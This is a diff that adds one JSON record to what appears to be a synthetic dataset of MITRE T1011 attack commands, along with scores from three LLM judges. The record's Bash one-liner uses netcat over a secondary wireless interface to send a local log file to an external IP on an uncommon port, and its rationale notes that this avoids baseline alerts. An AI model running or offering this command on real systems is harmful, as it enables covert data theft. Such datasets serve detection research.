@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan2 >/dev/null 2>&1 && nc -w 3 -s \"$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)\" 10.55.88.6 49321 < /home/user/.local/share/usage.log",
+  "explanation": "Sends data over a non-primary wireless interface (wlan2) using TCP to a high, uncommon port, consistent with T1011 by leveraging a separate wireless medium for exfiltration.",
+  "rationale_steps": [
+    "Confirm wlan2 status using iwconfig without changing configuration.",
+    "Bind the connection to wlan2’s IP to ensure use of the alternate medium.",
+    "Stream the file over a non-standard TCP port to minimize baseline alerts."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-fc2d1114",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with balanced quoting, valid flags, correct redirections, and proper command substitution and operators.",
+        "semantic_score": 4,
+        "semantic_justification": "Attempts exfiltration by binding nc to wlan2’s IPv4 address and sending the file over TCP, aligning with T1011, but it doesn’t verify wlan2 link/route and source binding may not guarantee egress via wlan2 in all environments.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T00:59:56.842058Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command chaining (&&), correct redirection (>/dev/null 2>&1, <), balanced quotes, valid command flags, and proper command substitution using $() syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by first checking if a secondary wireless interface (wlan2) exists, then using netcat to exfiltrate data from a local log file over this secondary network interface to a specific IP and uncommon port (49321).",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:00:02.479923Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for all commands, flags, redirection, command substitution, and logical operators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command robustly identifies and utilizes a specific wireless interface's IP as the source for netcat to exfiltrate a file, directly achieving T1011's objective of exfiltration over a separate network medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:21:43.680164Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
